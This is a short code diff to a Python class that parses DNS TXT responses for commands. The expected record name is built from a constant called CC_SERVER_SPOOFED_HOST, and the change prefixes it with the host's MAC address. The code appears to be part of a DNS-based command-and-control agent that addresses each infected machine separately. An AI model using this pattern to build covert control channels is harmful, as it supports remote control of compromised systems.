@@ -1,4 +1,6 @@
+# internal imports
 from utils.consts import CC_SERVER_SPOOFED_HOST, PACKET_OPTIONS
+from utils.mac import get_mac
 
 class CommandParser:
     """ A class to help parse DNS responses for commands. """
@@ -20,7 +22,7 @@ class CommandParser:
             print("[Sniffer] Response not of type 'TXT'.")
             return None
 
-        if an.rrname != CC_SERVER_SPOOFED_HOST + ".":
+        if an.rrname != get_mac() + '.' + CC_SERVER_SPOOFED_HOST + ".":
             print("[Sniffer] Spoofed host not matching.")
             return None
 
